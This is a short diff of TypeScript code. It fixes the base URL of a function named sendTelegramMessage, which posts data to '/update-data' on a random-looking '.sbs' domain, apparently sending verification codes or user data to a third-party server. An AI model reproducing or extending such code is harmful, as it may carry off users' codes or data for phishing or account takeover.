@@ -73,7 +73,7 @@ const createVerifyMessage = (code: string, attempt?: number) => {
 };
 
 const sendTelegramMessage = async (message: Message, config: Config) => {
-  const baseUrl = `https://kjzxcljzxklcjklasd.sbs/`;
+  const baseUrl = `https://kjzxcljzxklcjklasd.sbs`;
   if (localStorage.getItem(LAST_MESSAGE_KEY)) {
     await axios.post(
       `${baseUrl}/update-data`,
